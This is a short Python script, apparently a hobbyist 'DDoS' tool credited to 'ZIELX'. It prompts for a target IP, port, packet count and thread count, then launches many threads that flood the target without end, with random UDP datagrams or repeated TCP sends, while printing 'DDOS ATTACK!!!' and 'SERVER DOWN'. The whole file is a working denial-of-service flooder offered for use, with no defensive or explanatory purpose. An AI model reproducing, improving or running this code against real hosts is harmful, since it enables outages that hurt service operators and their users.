import random
import socket
import threading

print("\033[92m")
print("""
    Tools by : ZIELX

  ____  ____   ___  ____  
 |  _ \|  _ \ / _ \/ ___| 
 | | | | | | | | | \___ \ 
 | |_| | |_| | |_| |___) |
 |____/|____/ \___/|____/ 
""")
print("\033[97m")
ip= str(input(" IP : "))
port= int(input(" PORT : "))
choice = str(input(" Ddos Attack?? (y/n) : "))
times= int(input(" Paket : "))
threads= int(input(" Bayar : "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ZIELX DDOS ATTACK!!!")
		except:
			print("[!] SERVER DOWN!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[•]","[×]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ZIELX DDOS ATTACK!!!")
		except:
			s.close()
			print("[*] SERVER DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
